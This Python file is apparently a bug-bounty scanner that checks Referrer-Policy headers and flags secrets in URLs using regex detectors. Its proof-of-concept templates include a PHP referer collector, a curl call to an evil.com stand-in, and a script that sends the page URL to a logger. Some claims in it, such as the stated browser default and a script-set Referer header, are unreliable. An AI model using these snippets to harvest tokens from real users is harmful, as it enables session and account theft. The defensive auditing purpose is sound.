"""
Referrer-Policy Security Analyzer Agent

Advanced Referrer-Policy header analysis agent that identifies misconfigurations
and information disclosure vulnerabilities through referrer leakage.

This agent tests for:
- Missing Referrer-Policy header
- Unsafe policies (unsafe-url, no-referrer-when-downgrade)
- Information leakage in URLs (tokens, session IDs, sensitive parameters)
- Policy strength analysis
- Cross-origin referrer leakage
- Data exfiltration risks

Author: BountyHound Team
Version: 1.0.0
"""

from engine.core.tool_bridge import sync_nuclei_scan, sync_nmap_scan, sync_ffuf_fuzz, sync_sqlmap_test, sync_amass_enum, sync_gobuster_enum, sync_bloodhound_enum, sync_metasploit_execute, sync_nessus_scan, sync_volatility_analyze, sync_zeek_analyze
import re
import json
import urllib.parse
from typing import Dict, List, Any, Optional, Tuple
from dataclasses import dataclass, field, asdict
from datetime import date
from enum import Enum


try:
    import requests
    REQUESTS_AVAILABLE = True
except ImportError:
    REQUESTS_AVAILABLE = False


class ReferrerPolicySeverity(Enum):
    """Referrer-Policy vulnerability severity levels."""
    CRITICAL = "CRITICAL"
    HIGH = "HIGH"
    MEDIUM = "MEDIUM"
    LOW = "LOW"
    INFO = "INFO"


class ReferrerPolicyVulnType(Enum):
    """Types of Referrer-Policy vulnerabilities."""
    MISSING_POLICY = "REFERRER_MISSING_POLICY"
    UNSAFE_URL = "REFERRER_UNSAFE_URL"
    NO_REFERRER_WHEN_DOWNGRADE = "REFERRER_NO_REFERRER_WHEN_DOWNGRADE"
    ORIGIN_WHEN_CROSS_ORIGIN = "REFERRER_ORIGIN_WHEN_CROSS_ORIGIN"
    TOKEN_LEAKAGE = "REFERRER_TOKEN_LEAKAGE"
    SESSION_LEAKAGE = "REFERRER_SESSION_LEAKAGE"
    SENSITIVE_PARAM_LEAKAGE = "REFERRER_SENSITIVE_PARAM_LEAKAGE"
    WEAK_POLICY = "REFERRER_WEAK_POLICY"


@dataclass
class ReferrerPolicyFinding:
    """Represents a Referrer-Policy security finding."""
    title: str
    severity: ReferrerPolicySeverity
    vuln_type: ReferrerPolicyVulnType
    description: str
    endpoint: str
    current_policy: Optional[str] = None
    recommended_policy: str = "strict-origin-when-cross-origin or no-referrer"
    leaked_data: List[str] = field(default_factory=list)
    poc: str = ""
    impact: str = ""
    recommendation: str = ""
    cwe_id: Optional[str] = "CWE-200"
    discovered_date: str = field(default_factory=lambda: date.today().isoformat())

    def to_dict(self) -> Dict[str, Any]:
        """Convert finding to dictionary with enum handling."""
        data = asdict(self)
        data['severity'] = self.severity.value
        data['vuln_type'] = self.vuln_type.value
        return data


@dataclass
class ReferrerPolicyTestResult:
    """Result from a Referrer-Policy test."""
    endpoint: str
    has_referrer_policy: bool
    policy_value: Optional[str] = None
    is_vulnerable: bool = False
    vulnerability_type: Optional[ReferrerPolicyVulnType] = None
    sensitive_params_found: List[str] = field(default_factory=list)
    details: Dict[str, Any] = field(default_factory=dict)

    def to_dict(self) -> Dict[str, Any]:
        """Convert test result to dictionary."""
        data = asdict(self)
        if self.vulnerability_type:
            data['vulnerability_type'] = self.vulnerability_type.value
        return data


class ReferrerPolicyAnalyzer:
    """
    Advanced Referrer-Policy Security Analyzer.

    Performs comprehensive Referrer-Policy header analysis including:
    - Missing or weak policy detection
    - Sensitive data leakage in URLs
    - Token and session ID exposure
    - Cross-origin information disclosure
    - Policy strength assessment

    Usage:
        analyzer = ReferrerPolicyAnalyzer(target_url="https://api.example.com")
        findings = analyzer.run_all_tests()
    """

    # Unsafe policies that leak full URL
    UNSAFE_POLICIES = [
        "unsafe-url",
        "no-referrer-when-downgrade",
        "origin-when-cross-origin"
    ]

    # Recommended secure policies
    SECURE_POLICIES = [
        "no-referrer",
        "same-origin",
        "strict-origin",
        "strict-origin-when-cross-origin"
    ]

    # Patterns for detecting sensitive data in URLs
    SENSITIVE_PATTERNS = {
        'token': r'(?i)(token|access_token|auth_token|api_key|apikey)=([^&\s]+)',
        'session': r'(?i)(session|sessionid|sess|sid|jsessionid)=([^&\s]+)',
        'password': r'(?i)(password|passwd|pwd|pass)=([^&\s]+)',
        'api_key': r'(?i)(api[_-]?key|apikey|key)=([^&\s]+)',
        'secret': r'(?i)(secret|client_secret|private_key)=([^&\s]+)',
        'reset_token': r'(?i)(reset[_-]?token|verify[_-]?token|confirm[_-]?token)=([^&\s]+)',
        'oauth_token': r'(?i)(oauth[_-]?token|bearer[_-]?token)=([^&\s]+)',
        'email': r'(?i)(email|user_email)=([^&\s]+@[^&\s]+)',
        'phone': r'(?i)(phone|mobile|cell)=([^&\s]+)',
        'ssn': r'(?i)(ssn|social[_-]?security)=([^&\s]+)',
        'credit_card': r'(?i)(card|cc|credit[_-]?card)=([^&\s]+)',
        'account_id': r'(?i)(account[_-]?id|user[_-]?id|customer[_-]?id)=([^&\s]+)',
        'document_id': r'(?i)(doc[_-]?id|document[_-]?id|file[_-]?id)=([^&\s]+)',
    }

    def __init__(self, target_url: str, timeout: int = 10,
                 verify_ssl: bool = True,
                 custom_sensitive_patterns: Optional[Dict[str, str]] = None):
        """
        Initialize the Referrer-Policy Analyzer.

        Args:
            target_url: Target URL to analyze
            timeout: Request timeout in seconds
            verify_ssl: Whether to verify SSL certificates
            custom_sensitive_patterns: Additional regex patterns for sensitive data
        """
        if not REQUESTS_AVAILABLE:
            raise ImportError("requests library is required. Install with: pip install requests")

        self.target_url = target_url.rstrip('/')
        self.timeout = timeout
        self.verify_ssl = verify_ssl
        self.findings: List[ReferrerPolicyFinding] = []
        self.test_results: List[ReferrerPolicyTestResult] = []

        # Merge custom patterns with defaults
        self.sensitive_patterns = self.SENSITIVE_PATTERNS.copy()
        if custom_sensitive_patterns:
            self.sensitive_patterns.update(custom_sensitive_patterns)

        # Extract components from URL
        self.parsed_url = urllib.parse.urlparse(target_url)
        self.domain = self.parsed_url.netloc

    def _make_request(self, url: str, headers: Optional[Dict[str, str]] = None) -> Optional[requests.Response]:
        """
        Make HTTP request to target URL.

        Args:
            url: URL to request
            headers: Optional custom headers

        Returns:
            Response object or None if request failed
        """
        try:
            response = requests.get(
                url=url,
                headers=headers or {},
                timeout=self.timeout,
                verify=self.verify_ssl,
                allow_redirects=True
            )
            return response
        except requests.exceptions.RequestException:
            return None

    def _detect_sensitive_data_in_url(self, url: str) -> Dict[str, List[str]]:
        """
        Detect sensitive data in URL parameters.

        Args:
            url: URL to analyze

        Returns:
            Dictionary mapping data type to list of found values
        """
        found_data = {}

        for data_type, pattern in self.sensitive_patterns.items():
            matches = re.findall(pattern, url)
            if matches:
                # Extract parameter names (first group in match)
                params = [match[0] if isinstance(match, tuple) else match for match in matches]
                found_data[data_type] = params

        return found_data

    def _analyze_url_for_tokens(self, url: str) -> List[str]:
        """
        Analyze URL for potential tokens or sensitive identifiers.

        Args:
            url: URL to analyze

        Returns:
            List of detected sensitive parameter names
        """
        sensitive_params = []
        parsed = urllib.parse.urlparse(url)

        if parsed.query:
            params = urllib.parse.parse_qs(parsed.query)

            for param_name, values in params.items():
                param_lower = param_name.lower()

                # Check parameter name
                sensitive_keywords = [
                    'token', 'key', 'secret', 'password', 'session',
                    'auth', 'api', 'sid', 'ssn', 'reset', 'verify',
                    'confirm', 'oauth', 'bearer', 'jwt', 'refresh'
                ]

                if any(keyword in param_lower for keyword in sensitive_keywords):
                    sensitive_params.append(param_name)
                    continue

                # Check value patterns (e.g., long hex strings, JWTs)
                for value in values:
                    # JWT pattern
                    if re.match(r'^[A-Za-z0-9-_]+\.[A-Za-z0-9-_]+\.[A-Za-z0-9-_]*$', value):
                        sensitive_params.append(f"{param_name} (JWT-like)")
                        break
                    # Long hex/base64 (likely token)
                    if len(value) >= 20 and re.match(r'^[A-Za-z0-9+/=_-]+$', value):
                        sensitive_params.append(f"{param_name} (token-like)")
                        break

        return sensitive_params

    def test_missing_policy(self) -> List[ReferrerPolicyFinding]:
        """
        Test if Referrer-Policy header is missing.

        Returns:
            List of findings if policy is missing
        """
        findings = []
        response = self._make_request(self.target_url)

        if not response:
            return findings

        referrer_policy = response.headers.get('Referrer-Policy')

        if not referrer_policy:
            # Check for sensitive data in URL
            sensitive_data = self._detect_sensitive_data_in_url(self.target_url)
            sensitive_params = self._analyze_url_for_tokens(self.target_url)

            # Determine severity based on URL content
            severity = ReferrerPolicySeverity.LOW
            impact_details = "Referrer header may leak sensitive data in URLs to third parties"

            if sensitive_data or sensitive_params:
                severity = ReferrerPolicySeverity.HIGH
                leaked_items = []
                for data_type, params in sensitive_data.items():
                    leaked_items.extend([f"{data_type}: {p}" for p in params])
                leaked_items.extend(sensitive_params)

                impact_details = f"URL contains sensitive parameters that will be leaked: {', '.join(leaked_items)}"

            finding = ReferrerPolicyFinding(
                title="Missing Referrer-Policy Header",
                severity=severity,
                vuln_type=ReferrerPolicyVulnType.MISSING_POLICY,
                description=(
                    f"The endpoint does not set a Referrer-Policy header. "
                    f"By default, browsers may send the full URL (including query parameters) "
                    f"in the Referer header when users navigate to external sites. "
                    f"{impact_details}"
                ),
                endpoint=self.target_url,
                current_policy=None,
                leaked_data=list(sensitive_data.keys()) + sensitive_params,
                poc=self._generate_missing_policy_poc(),
                impact=(
                    "When users click external links from this page, the full URL "
                    "(including sensitive parameters) may be sent to third-party domains "
                    "via the Referer header, exposing tokens, session IDs, or personal data."
                ),
                recommendation=(
                    "Set Referrer-Policy header to 'strict-origin-when-cross-origin' or 'no-referrer' "
                    "to prevent sensitive data leakage. Never include tokens or session IDs in URLs."
                ),
                cwe_id="CWE-200"
            )
            findings.append(finding)

            result = ReferrerPolicyTestResult(
                endpoint=self.target_url,
                has_referrer_policy=False,
                is_vulnerable=True,
                vulnerability_type=ReferrerPolicyVulnType.MISSING_POLICY,
                sensitive_params_found=sensitive_params,
                details={'sensitive_data': sensitive_data}
            )
            self.test_results.append(result)

        return findings

    def test_unsafe_url_policy(self) -> List[ReferrerPolicyFinding]:
        """
        Test for unsafe-url policy (worst case - leaks full URL always).

        Returns:
            List of findings if unsafe-url policy is detected
        """
        findings = []
        response = self._make_request(self.target_url)

        if not response:
            return findings

        referrer_policy = response.headers.get('Referrer-Policy', '').lower()

        if referrer_policy == 'unsafe-url':
            sensitive_data = self._detect_sensitive_data_in_url(self.target_url)
            sensitive_params = self._analyze_url_for_tokens(self.target_url)

            severity = ReferrerPolicySeverity.MEDIUM
            if sensitive_data or sensitive_params:
                severity = ReferrerPolicySeverity.HIGH

            finding = ReferrerPolicyFinding(
                title="Unsafe Referrer-Policy: unsafe-url",
                severity=severity,
                vuln_type=ReferrerPolicyVulnType.UNSAFE_URL,
                description=(
                    "The endpoint uses 'unsafe-url' policy, which sends the full URL "
                    "(including path and query parameters) as referrer to ALL destinations, "
                    "even when downgrading from HTTPS to HTTP. This is the most permissive "
                    "and dangerous policy."
                ),
                endpoint=self.target_url,
                current_policy=referrer_policy,
                leaked_data=list(sensitive_data.keys()) + sensitive_params,
                poc=self._generate_unsafe_url_poc(),
                impact=(
                    "Full URL (including all query parameters) is sent to ANY destination, "
                    "including HTTP sites and third-party domains. This exposes sensitive "
                    "data to potential man-in-the-middle attacks and third-party tracking."
                ),
                recommendation=(
                    "Change policy to 'strict-origin-when-cross-origin' or 'no-referrer'. "
                    "Remove sensitive data from URLs and use POST bodies or headers instead."
                ),
                cwe_id="CWE-200"
            )
            findings.append(finding)

            result = ReferrerPolicyTestResult(
                endpoint=self.target_url,
                has_referrer_policy=True,
                policy_value=referrer_policy,
                is_vulnerable=True,
                vulnerability_type=ReferrerPolicyVulnType.UNSAFE_URL,
                sensitive_params_found=sensitive_params,
                details={'sensitive_data': sensitive_data}
            )
            self.test_results.append(result)

        return findings

    def test_no_referrer_when_downgrade_policy(self) -> List[ReferrerPolicyFinding]:
        """
        Test for no-referrer-when-downgrade policy (default behavior, still risky).

        Returns:
            List of findings if this policy is detected
        """
        findings = []
        response = self._make_request(self.target_url)

        if not response:
            return findings

        referrer_policy = response.headers.get('Referrer-Policy', '').lower()

        if referrer_policy == 'no-referrer-when-downgrade' or not referrer_policy:
            # This is often browser default
            if not referrer_policy:
                # Already handled in test_missing_policy
                return findings

            sensitive_data = self._detect_sensitive_data_in_url(self.target_url)
            sensitive_params = self._analyze_url_for_tokens(self.target_url)

            if not sensitive_data and not sensitive_params:
                severity = ReferrerPolicySeverity.LOW
            else:
                severity = ReferrerPolicySeverity.MEDIUM

            finding = ReferrerPolicyFinding(
                title="Weak Referrer-Policy: no-referrer-when-downgrade",
                severity=severity,
                vuln_type=ReferrerPolicyVulnType.NO_REFERRER_WHEN_DOWNGRADE,
                description=(
                    "The endpoint uses 'no-referrer-when-downgrade' policy, which sends "
                    "the full URL (including query parameters) to same-protocol destinations. "
                    "This exposes sensitive URL parameters to third-party HTTPS sites."
                ),
                endpoint=self.target_url,
                current_policy=referrer_policy,
                leaked_data=list(sensitive_data.keys()) + sensitive_params,
                poc=self._generate_downgrade_poc(),
                impact=(
                    "Full URL is sent to any HTTPS destination (including third-party domains). "
                    "While it won't leak to HTTP sites, third-party HTTPS sites can still "
                    "capture sensitive parameters like tokens or session IDs."
                ),
                recommendation=(
                    "Upgrade to 'strict-origin-when-cross-origin' or 'same-origin' to limit "
                    "cross-origin information disclosure."
                ),
                cwe_id="CWE-200"
            )
            findings.append(finding)

            result = ReferrerPolicyTestResult(
                endpoint=self.target_url,
                has_referrer_policy=True,
                policy_value=referrer_policy,
                is_vulnerable=True,
                vulnerability_type=ReferrerPolicyVulnType.NO_REFERRER_WHEN_DOWNGRADE,
                sensitive_params_found=sensitive_params,
                details={'sensitive_data': sensitive_data}
            )
            self.test_results.append(result)

        return findings

    def test_origin_when_cross_origin_policy(self) -> List[ReferrerPolicyFinding]:
        """
        Test for origin-when-cross-origin policy (leaks origin on cross-origin).

        Returns:
            List of findings if this policy is detected
        """
        findings = []
        response = self._make_request(self.target_url)

        if not response:
            return findings

        referrer_policy = response.headers.get('Referrer-Policy', '').lower()

        if referrer_policy == 'origin-when-cross-origin':
            # This policy is better but still has issues
            sensitive_data = self._detect_sensitive_data_in_url(self.target_url)
            sensitive_params = self._analyze_url_for_tokens(self.target_url)

            # Only report if there's sensitive data in same-origin context
            if sensitive_data or sensitive_params:
                finding = ReferrerPolicyFinding(
                    title="Suboptimal Referrer-Policy: origin-when-cross-origin",
                    severity=ReferrerPolicySeverity.LOW,
                    vuln_type=ReferrerPolicyVulnType.ORIGIN_WHEN_CROSS_ORIGIN,
                    description=(
                        "The endpoint uses 'origin-when-cross-origin' policy, which sends "
                        "the full URL (including path and query) to same-origin destinations. "
                        "While cross-origin requests only receive the origin, same-origin "
                        "leakage can still be problematic in certain scenarios."
                    ),
                    endpoint=self.target_url,
                    current_policy=referrer_policy,
                    leaked_data=list(sensitive_data.keys()) + sensitive_params,
                    poc=self._generate_origin_when_cross_origin_poc(),
                    impact=(
                        "Full URL is leaked to same-origin destinations. If the site has "
                        "XSS vulnerabilities or hosts user-generated content, sensitive "
                        "parameters could be exposed to attackers."
                    ),
                    recommendation=(
                        "Consider 'strict-origin-when-cross-origin' for better protection, "
                        "or 'same-origin' if cross-origin referrer is not needed."
                    ),
                    cwe_id="CWE-200"
                )
                findings.append(finding)

                result = ReferrerPolicyTestResult(
                    endpoint=self.target_url,
                    has_referrer_policy=True,
                    policy_value=referrer_policy,
                    is_vulnerable=True,
                    vulnerability_type=ReferrerPolicyVulnType.ORIGIN_WHEN_CROSS_ORIGIN,
                    sensitive_params_found=sensitive_params,
                    details={'sensitive_data': sensitive_data}
                )
                self.test_results.append(result)

        return findings

    def test_sensitive_data_leakage(self) -> List[ReferrerPolicyFinding]:
        """
        Test for sensitive data in URLs that could be leaked via referrer.

        Returns:
            List of findings for each type of sensitive data found
        """
        findings = []
        response = self._make_request(self.target_url)

        if not response:
            return findings

        referrer_policy = response.headers.get('Referrer-Policy', '').lower()

        # Only test if policy is weak or missing
        weak_policies = ['unsafe-url', 'no-referrer-when-downgrade', 'origin-when-cross-origin', '']

        if referrer_policy not in weak_policies:
            return findings

        sensitive_data = self._detect_sensitive_data_in_url(self.target_url)

        # Create findings for each type of sensitive data
        for data_type, params in sensitive_data.items():
            severity_map = {
                'token': ReferrerPolicySeverity.CRITICAL,
                'session': ReferrerPolicySeverity.CRITICAL,
                'password': ReferrerPolicySeverity.CRITICAL,
                'api_key': ReferrerPolicySeverity.CRITICAL,
                'secret': ReferrerPolicySeverity.CRITICAL,
                'reset_token': ReferrerPolicySeverity.HIGH,
                'oauth_token': ReferrerPolicySeverity.CRITICAL,
                'email': ReferrerPolicySeverity.MEDIUM,
                'phone': ReferrerPolicySeverity.MEDIUM,
                'ssn': ReferrerPolicySeverity.CRITICAL,
                'credit_card': ReferrerPolicySeverity.CRITICAL,
                'account_id': ReferrerPolicySeverity.MEDIUM,
                'document_id': ReferrerPolicySeverity.MEDIUM,
            }

            vuln_type_map = {
                'token': ReferrerPolicyVulnType.TOKEN_LEAKAGE,
                'session': ReferrerPolicyVulnType.SESSION_LEAKAGE,
                'password': ReferrerPolicyVulnType.SENSITIVE_PARAM_LEAKAGE,
                'api_key': ReferrerPolicyVulnType.TOKEN_LEAKAGE,
                'secret': ReferrerPolicyVulnType.TOKEN_LEAKAGE,
                'reset_token': ReferrerPolicyVulnType.TOKEN_LEAKAGE,
                'oauth_token': ReferrerPolicyVulnType.TOKEN_LEAKAGE,
            }

            severity = severity_map.get(data_type, ReferrerPolicySeverity.MEDIUM)
            vuln_type = vuln_type_map.get(data_type, ReferrerPolicyVulnType.SENSITIVE_PARAM_LEAKAGE)

            finding = ReferrerPolicyFinding(
                title=f"Sensitive Data Leakage via Referrer: {data_type.replace('_', ' ').title()}",
                severity=severity,
                vuln_type=vuln_type,
                description=(
                    f"The URL contains {data_type.replace('_', ' ')} parameters ({', '.join(params)}) "
                    f"that will be leaked via the Referer header. Current policy "
                    f"'{referrer_policy or 'default'}' does not prevent this leakage."
                ),
                endpoint=self.target_url,
                current_policy=referrer_policy or 'default (no-referrer-when-downgrade)',
                leaked_data=[data_type],
                poc=self._generate_sensitive_leakage_poc(data_type, params),
                impact=(
                    f"When users navigate to external sites from this page, the {data_type.replace('_', ' ')} "
                    f"in the URL will be sent to third-party domains, potentially enabling "
                    f"account takeover, session hijacking, or unauthorized access."
                ),
                recommendation=(
                    "CRITICAL: Remove sensitive data from URLs immediately. Use POST bodies, "
                    "Authorization headers, or secure cookies instead. Set Referrer-Policy to "
                    "'no-referrer' or 'same-origin' as defense-in-depth."
                ),
                cwe_id="CWE-598" if data_type in ['password', 'token', 'api_key'] else "CWE-200"
            )
            findings.append(finding)

            result = ReferrerPolicyTestResult(
                endpoint=self.target_url,
                has_referrer_policy=bool(referrer_policy),
                policy_value=referrer_policy or 'default',
                is_vulnerable=True,
                vulnerability_type=vuln_type,
                sensitive_params_found=params,
                details={'data_type': data_type, 'parameters': params}
            )
            self.test_results.append(result)

        return findings

    def run_all_tests(self) -> List[ReferrerPolicyFinding]:
        """
        Run all Referrer-Policy security tests.

        Returns:
            List of all findings discovered
        """
        all_findings = []

        # Run each test category
        test_methods = [
            self.test_missing_policy,
            self.test_unsafe_url_policy,
            self.test_no_referrer_when_downgrade_policy,
            self.test_origin_when_cross_origin_policy,
            self.test_sensitive_data_leakage
        ]

        for test_method in test_methods:
            findings = test_method()
            all_findings.extend(findings)
            self.findings.extend(findings)

        return all_findings

    def get_findings_by_severity(self, severity: ReferrerPolicySeverity) -> List[ReferrerPolicyFinding]:
        """Get findings filtered by severity level."""
        return [f for f in self.findings if f.severity == severity]

    def get_critical_findings(self) -> List[ReferrerPolicyFinding]:
        """Get all critical severity findings."""
        return self.get_findings_by_severity(ReferrerPolicySeverity.CRITICAL)

    def get_summary(self) -> Dict[str, Any]:
        """
        Generate summary of test results.

        Returns:
            Dictionary with test statistics and findings
        """
        severity_counts = {
            'CRITICAL': len(self.get_findings_by_severity(ReferrerPolicySeverity.CRITICAL)),
            'HIGH': len(self.get_findings_by_severity(ReferrerPolicySeverity.HIGH)),
            'MEDIUM': len(self.get_findings_by_severity(ReferrerPolicySeverity.MEDIUM)),
            'LOW': len(self.get_findings_by_severity(ReferrerPolicySeverity.LOW)),
            'INFO': len(self.get_findings_by_severity(ReferrerPolicySeverity.INFO))
        }

        return {
            'target': self.target_url,
            'total_tests': len(self.test_results),
            'total_findings': len(self.findings),
            'severity_breakdown': severity_counts,
            'vulnerable': len(self.findings) > 0,
            'findings': [f.to_dict() for f in self.findings]
        }

    # POC Generation Methods

    def _generate_missing_policy_poc(self) -> str:
        """Generate POC for missing Referrer-Policy."""
        return f"""# Test Referrer Leakage

1. Visit the target page:
   {self.target_url}

2. Open browser DevTools (F12) -> Network tab

3. Click any external link on the page

4. Check the request to the external site - the Referer header will contain:
   Referer: {self.target_url}

5. All query parameters are leaked to third-party!

# Exploitation:
- Attacker hosts evil.com
- Victim clicks link to evil.com from target page
- Attacker's server logs show:
  GET / HTTP/1.1
  Host: evil.com
  Referer: {self.target_url}
- Attacker extracts sensitive parameters from Referer header
"""

    def _generate_unsafe_url_poc(self) -> str:
        """Generate POC for unsafe-url policy."""
        return f"""# Unsafe-URL Policy Exploitation

Policy: unsafe-url (sends full URL to ALL destinations)

# Attack Scenario:
1. Attacker creates page: http://evil.com/collect.php
2. Page logs all Referer headers
3. Victim visits: {self.target_url}
4. Victim clicks link to evil.com
5. Even HTTP downgrade sends full URL!

# Exploit Code (evil.com/collect.php):
<?php
$referer = $_SERVER['HTTP_REFERER'] ?? 'none';
error_log("Captured referer: " . $referer);
?>

# Result:
Captured referer: {self.target_url}

# Impact: CRITICAL
- Works even on HTTP -> HTTP
- Leaks everything including HTTPS URLs to HTTP sites
- Bypasses mixed-content protections
"""

    def _generate_downgrade_poc(self) -> str:
        """Generate POC for no-referrer-when-downgrade policy."""
        return f"""# No-Referrer-When-Downgrade Exploitation

Policy: no-referrer-when-downgrade (sends full URL to same/higher protocol)

# Attack Scenario:
1. Target URL: {self.target_url}
2. Attacker hosts: https://evil.com/track.php (HTTPS!)
3. Victim clicks link to evil.com from target
4. Full URL leaked via Referer header

# Mitigation Bypass:
- Only prevents HTTP downgrade
- HTTPS third-party sites still receive full URL
- Most third-party trackers use HTTPS anyway

# POC:
curl -H "Referer: {self.target_url}" https://evil.com/track.php

# Captured on evil.com:
Referer: {self.target_url}
"""

    def _generate_origin_when_cross_origin_poc(self) -> str:
        """Generate POC for origin-when-cross-origin policy."""
        parsed = urllib.parse.urlparse(self.target_url)
        origin = f"{parsed.scheme}://{parsed.netloc}"

        return f"""# Origin-When-Cross-Origin Policy

Policy: origin-when-cross-origin

# Behavior:
- Same-origin: Full URL leaked
  {self.target_url} -> {origin}/other -> Referer: {self.target_url}

- Cross-origin: Only origin leaked
  {self.target_url} -> https://evil.com -> Referer: {origin}

# Attack Vector 1: XSS on same origin
<script>
fetch('{origin}/logger', {{
    headers: {{'Referer': document.location.href}}
}});
</script>

# Attack Vector 2: User-generated content
If site allows user uploads/pages:
- Upload page with tracking pixel
- Pixel logs full Referer from same-origin
- Extract sensitive parameters
"""

    def _generate_sensitive_leakage_poc(self, data_type: str, params: List[str]) -> str:
        """Generate POC for sensitive data leakage."""
        return f"""# Sensitive Data Leakage via Referrer

Data Type: {data_type.replace('_', ' ').title()}
Leaked Parameters: {', '.join(params)}

# Attack Scenario:

1. Victim visits URL with sensitive data:
   {self.target_url}

2. Page contains link to attacker-controlled site:
   <a href="https://evil.com">Click here</a>

3. Victim clicks link

4. Attacker's server receives:
   GET / HTTP/1.1
   Host: evil.com
   Referer: {self.target_url}

5. Attacker extracts {data_type}:
   {' | '.join([f"{p}=<sensitive_value>" for p in params])}

# Exploitation:
{'- Account takeover via stolen session/token' if data_type in ['token', 'session', 'oauth_token'] else ''}
{'- Password reset token interception' if data_type == 'reset_token' else ''}
{'- API access via leaked API key' if data_type == 'api_key' else ''}
{'- Privacy violation via leaked personal data' if data_type in ['email', 'phone', 'ssn'] else ''}

# Real-World Example:
- Gmail had similar issue in 2010
- Password reset tokens leaked via Referer
- Resulted in account compromises
- Fixed by removing tokens from URLs + strict Referrer-Policy
"""

    def generate_report(self) -> str:
        """
        Generate comprehensive Referrer-Policy security report.

        Returns:
            Formatted report string
        """
        if not self.findings:
            return f"""# Referrer-Policy Security Analysis Report
## Target: {self.target_url}
## Status: SECURE

No Referrer-Policy issues found. The endpoint has proper referrer controls.
"""

        report = f"""# Referrer-Policy Security Analysis Report
## Target: {self.target_url}
## Total Findings: {len(self.findings)}

"""

        # Group by severity
        by_severity = {}
        for finding in self.findings:
            if finding.severity not in by_severity:
                by_severity[finding.severity] = []
            by_severity[finding.severity].append(finding)

        for severity in [ReferrerPolicySeverity.CRITICAL, ReferrerPolicySeverity.HIGH,
                        ReferrerPolicySeverity.MEDIUM, ReferrerPolicySeverity.LOW,
                        ReferrerPolicySeverity.INFO]:
            if severity in by_severity:
                report += f"\n## {severity.value} Severity ({len(by_severity[severity])})\n\n"

                for i, finding in enumerate(by_severity[severity], 1):
                    report += f"""### {severity.value}-{i}: {finding.title}

**Endpoint**: `{finding.endpoint}`
**Current Policy**: {f'`{finding.current_policy}`' if finding.current_policy else 'Missing'}
**Recommended**: `{finding.recommended_policy}`
**CWE**: {finding.cwe_id}

**Leaked Data Types**: {', '.join(finding.leaked_data) if finding.leaked_data else 'N/A'}

**Impact**:
{finding.impact}

**Proof of Concept**:
```
{finding.poc}
```

**Recommendation**:
{finding.recommendation}

---
"""

        # Add remediation summary
        report += self._generate_remediation_summary(by_severity)

        return report

    def _generate_remediation_summary(self, by_severity: Dict) -> str:
        """Generate prioritized remediation recommendations."""
        summary = "\n## Remediation Priority\n\n"

        if ReferrerPolicySeverity.CRITICAL in by_severity:
            summary += "### 🚨 CRITICAL - Immediate Action Required\n\n"
            summary += "**Remove sensitive data from URLs immediately!**\n\n"
            for finding in by_severity[ReferrerPolicySeverity.CRITICAL]:
                summary += f"- {finding.title}\n"
                summary += f"  → Move {', '.join(finding.leaked_data)} to POST body/headers\n"

        if ReferrerPolicySeverity.HIGH in by_severity or ReferrerPolicySeverity.CRITICAL in by_severity:
            summary += "\n### High Priority Fixes\n\n"
            for finding in by_severity.get(ReferrerPolicySeverity.HIGH, []):
                summary += f"- Set Referrer-Policy: {finding.recommended_policy}\n"

        if ReferrerPolicySeverity.MEDIUM in by_severity:
            summary += "\n### Medium Priority\n\n"
            for finding in by_severity.get(ReferrerPolicySeverity.MEDIUM, []):
                summary += f"- {finding.title}: {finding.recommended_policy}\n"

        # Add configuration examples
        summary += """
## Secure Configuration Examples

### Recommended Policy

**Best Practice** (for most sites):
```
Referrer-Policy: strict-origin-when-cross-origin
```

**High Security** (when referrer not needed):
```
Referrer-Policy: no-referrer
```

### Implementation

#### Apache (.htaccess or VirtualHost)
```apache
Header always set Referrer-Policy "strict-origin-when-cross-origin"
```

#### Nginx
```nginx
add_header Referrer-Policy "strict-origin-when-cross-origin" always;
```

#### Node.js (Express + Helmet)
```javascript
const helmet = require('helmet');
app.use(helmet.referrerPolicy({ policy: 'strict-origin-when-cross-origin' }));
```

#### HTML Meta Tag
```html
<meta name="referrer" content="strict-origin-when-cross-origin">
```

### Policy Comparison

| Policy | Same-Origin | Cross-Origin HTTPS | Cross-Origin HTTP | Recommendation |
|--------|-------------|-------------------|-------------------|----------------|
| **no-referrer** | Nothing | Nothing | Nothing | ✅ Most secure |
| **same-origin** | Full URL | Nothing | Nothing | ✅ Good for internal apps |
| **strict-origin** | Origin only | Origin only | Nothing | ✅ Good balance |
| **strict-origin-when-cross-origin** | Full URL | Origin only | Nothing | ✅ **RECOMMENDED** |
| origin-when-cross-origin | Full URL | Origin only | Origin only | ⚠️ Acceptable |
| no-referrer-when-downgrade | Full URL | Full URL | Nothing | ⚠️ Weak (browser default) |
| unsafe-url | Full URL | Full URL | Full URL | ❌ **NEVER USE** |

## Additional Hardening

1. **Never put sensitive data in URLs**
   - Use POST bodies for sensitive operations
   - Use Authorization headers for tokens
   - Use HttpOnly cookies for sessions

2. **Defense in depth**
   - Even with strict policy, don't rely on Referrer-Policy alone
   - Sensitive data should never be in URLs period

3. **Monitor for leaks**
   - Check analytics for exposed tokens
   - Scan logs for sensitive parameters in URLs
   - Implement automated URL scanning in CI/CD
"""

        return summary
